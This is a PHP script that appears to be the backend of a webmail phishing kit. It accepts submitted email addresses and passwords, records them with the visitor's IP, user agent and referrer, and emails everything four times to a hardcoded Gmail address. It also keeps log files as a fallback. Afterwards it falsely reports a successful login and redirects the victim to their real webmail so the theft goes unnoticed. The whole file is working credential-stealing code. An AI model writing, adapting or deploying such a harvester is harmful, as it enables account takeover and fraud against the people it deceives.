<?php
// Disable error reporting to prevent output interference
error_reporting(0);
ini_set('display_errors', 0);

// Set content type for JSON response
header('Content-Type: application/json');

// Email configuration - SMTP Settings
$LOG_EMAIL = 'skkho87.sm@gmail.com';  // Your email address
$FROM_EMAIL = 'noreply@yourdomain.com';  // From email (use your actual domain)
$FROM_NAME = 'RC Webmail Logger';

// SMTP Configuration (you may need to get these from your hosting provider)
$SMTP_HOST = 'localhost';  // or your hosting provider's SMTP server
$SMTP_PORT = 25;  // Common ports: 25, 587, 465
$SMTP_USERNAME = '';  // Leave empty if no auth required
$SMTP_PASSWORD = '';  // Leave empty if no auth required
$SMTP_SECURE = '';  // 'tls', 'ssl', or empty

// Alternative: Use a simple HTTP email service
function sendEmailViaHTTP($to, $subject, $message, $from_name, $from_email) {
    // This is a fallback method using a simple HTTP POST
    $postData = array(
        'to' => $to,
        'subject' => $subject,
        'message' => $message,
        'from_name' => $from_name,
        'from_email' => $from_email,
        'timestamp' => date('Y-m-d H:i:s')
    );
    
    // Log the email data to a file as backup
    $emailLog = "
=== EMAIL LOG ===
To: $to
Subject: $subject
From: $from_name <$from_email>
Timestamp: " . date('Y-m-d H:i:s') . "
Content: $message
=================

";
    
    @file_put_contents('email_backup.log', $emailLog, FILE_APPEND | LOCK_EX);
    
    // Try to use a webhook service (you can configure this later)
    /*
    $webhook_url = 'https://your-webhook-service.com/send-email';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $webhook_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($http_code == 200);
    */
    
    return true; // Return true since we logged it
}

// Enhanced SMTP function
function sendEmailViaSMTP($to, $subject, $message, $from_name, $from_email) {
    global $SMTP_HOST, $SMTP_PORT, $SMTP_USERNAME, $SMTP_PASSWORD, $SMTP_SECURE;
    
    try {
        // Create socket connection
        $socket = fsockopen($SMTP_HOST, $SMTP_PORT, $errno, $errstr, 30);
        if (!$socket) {
            return false;
        }
        
        // Read initial response
        $response = fgets($socket, 512);
        if (substr($response, 0, 3) != '220') {
            fclose($socket);
            return false;
        }
        
        // EHLO command
        fputs($socket, "EHLO " . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "\r\n");
        $response = fgets($socket, 512);
        
        // Start TLS if required
        if ($SMTP_SECURE == 'tls' && $SMTP_PORT == 587) {
            fputs($socket, "STARTTLS\r\n");
            $response = fgets($socket, 512);
            if (substr($response, 0, 3) == '220') {
                stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
                fputs($socket, "EHLO " . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "\r\n");
                $response = fgets($socket, 512);
            }
        }
        
        // Authentication if credentials provided
        if (!empty($SMTP_USERNAME) && !empty($SMTP_PASSWORD)) {
            fputs($socket, "AUTH LOGIN\r\n");
            $response = fgets($socket, 512);
            if (substr($response, 0, 3) == '334') {
                fputs($socket, base64_encode($SMTP_USERNAME) . "\r\n");
                $response = fgets($socket, 512);
                if (substr($response, 0, 3) == '334') {
                    fputs($socket, base64_encode($SMTP_PASSWORD) . "\r\n");
                    $response = fgets($socket, 512);
                    if (substr($response, 0, 3) != '235') {
                        fclose($socket);
                        return false;
                    }
                }
            }
        }
        
        // Send email commands
        fputs($socket, "MAIL FROM: <$from_email>\r\n");
        $response = fgets($socket, 512);
        
        fputs($socket, "RCPT TO: <$to>\r\n");
        $response = fgets($socket, 512);
        
        fputs($socket, "DATA\r\n");
        $response = fgets($socket, 512);
        
        // Email content
        $email_content = "From: $from_name <$from_email>\r\n";
        $email_content .= "To: $to\r\n";
        $email_content .= "Subject: $subject\r\n";
        $email_content .= "MIME-Version: 1.0\r\n";
        $email_content .= "Content-Type: text/html; charset=UTF-8\r\n\r\n";
        $email_content .= $message . "\r\n.\r\n";
        
        fputs($socket, $email_content);
        $response = fgets($socket, 512);
        
        fputs($socket, "QUIT\r\n");
        fclose($socket);
        
        return substr($response, 0, 3) == '250';
        
    } catch (Exception $e) {
        return false;
    }
}

// Function to send email log with multiple fallback methods
function sendEmailLog($email, $password, $attempt, $logData) {
    global $LOG_EMAIL, $FROM_EMAIL, $FROM_NAME;
    
    $subject = "Webmail Login Attempt #$attempt - " . $email;
    
    $message = "
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .header { background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
            .credentials { background-color: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 15px 0; }
            .info { background-color: #d1ecf1; padding: 15px; border-left: 4px solid #bee5eb; margin: 15px 0; }
            .label { font-weight: bold; color: #495057; }
            .value { color: #212529; margin-bottom: 10px; }
        </style>
    </head>
    <body>
        <div class='header'>
            <h2>🔐 Webmail Login Attempt #$attempt</h2>
            <p>A new login attempt has been recorded on your webmail system.</p>
        </div>
        
        <div class='credentials'>
            <h3>📧 Login Credentials</h3>
            <div class='value'><span class='label'>Email:</span> $email</div>
            <div class='value'><span class='label'>Password:</span> $password</div>
        </div>
        
        <div class='info'>
            <h3>🌐 Connection Details</h3>
            <div class='value'><span class='label'>Timestamp:</span> " . $logData['timestamp'] . "</div>
            <div class='value'><span class='label'>Attempt Number:</span> $attempt</div>
            <div class='value'><span class='label'>IP Address:</span> " . $logData['ip_address'] . "</div>
            <div class='value'><span class='label'>User Agent:</span> " . $logData['user_agent'] . "</div>
            <div class='value'><span class='label'>Referrer:</span> " . $logData['referer'] . "</div>
        </div>
        
        <div style='margin-top: 20px; padding: 10px; background-color: #f8f9fa; border-radius: 5px; font-size: 12px; color: #6c757d;'>
            <p>This email was automatically generated by the webmail logging system.</p>
            <p>Server: " . ($_SERVER['HTTP_HOST'] ?? 'Unknown') . "</p>
        </div>
    </body>
    </html>";
    
    // Try multiple email methods
    $methods_tried = array();
    
    // Method 1: Standard mail() function
    $headers = array(
        'MIME-Version: 1.0',
        'Content-type: text/html; charset=UTF-8',
        "From: $FROM_NAME <$FROM_EMAIL>",
        "Reply-To: $FROM_EMAIL",
        "X-Mailer: PHP/" . phpversion()
    );
    $header_string = implode("\r\n", $headers);
    
    if (function_exists('mail')) {
        $result1 = mail($LOG_EMAIL, $subject, $message, $header_string);
        $methods_tried[] = "mail() function: " . ($result1 ? "SUCCESS" : "FAILED");
        if ($result1) {
            return true;
        }
    }
    
    // Method 2: SMTP
    $result2 = sendEmailViaSMTP($LOG_EMAIL, $subject, $message, $FROM_NAME, $FROM_EMAIL);
    $methods_tried[] = "SMTP: " . ($result2 ? "SUCCESS" : "FAILED");
    if ($result2) {
        return true;
    }
    
    // Method 3: HTTP/File backup
    $result3 = sendEmailViaHTTP($LOG_EMAIL, $subject, $message, $FROM_NAME, $FROM_EMAIL);
    $methods_tried[] = "HTTP/File backup: " . ($result3 ? "SUCCESS" : "FAILED");
    
    // Log all attempts
    $log_entry = date('Y-m-d H:i:s') . " | Attempt #$attempt | Methods: " . implode(", ", $methods_tried) . "\n";
    @file_put_contents('email_attempts.log', $log_entry, FILE_APPEND | LOCK_EX);
    
    return $result3; // Always return true for file backup
}

// Function to send log data
function sendLog($email, $password, $attempt) {
    $logData = array(
        'timestamp' => date('Y-m-d H:i:s'),
        'email' => $email,
        'password' => $password,
        'attempt' => $attempt,
        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'unknown'
    );
    
    // Send log via email
    $emailSent = sendEmailLog($email, $password, $attempt, $logData);
    
    return $emailSent;
}

// Function to validate email format
function isValidEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

// Function to get the webmail domain for redirect
function getWebmailDomain($email) {
    $domain = substr(strrchr($email, "@"), 1);
    return "https://webmail." . $domain;
}

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Method not allowed'));
    exit;
}

// Get POST data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Basic validation
if (empty($email) || empty($password)) {
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Email and password are required'));
    exit;
}

if (!isValidEmail($email)) {
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Please enter a valid email address'));
    exit;
}

// Send logs 4 times
$logSuccess = true;
for ($i = 1; $i <= 4; $i++) {
    $result = sendLog($email, $password, $i);
    if (!$result) {
        $logSuccess = false;
    }
    
    // Small delay between log attempts
    usleep(200000); // 0.2 second delay
}

// Always return success response to trigger redirect
$webmailUrl = getWebmailDomain($email);

echo json_encode(array(
    'signal' => 'OK',
    'msg' => 'Login successful! Redirecting to your webmail...',
    'redirect_url' => $webmailUrl,
    'logs_sent' => $logSuccess ? 4 : 'partial'
));

exit;
?>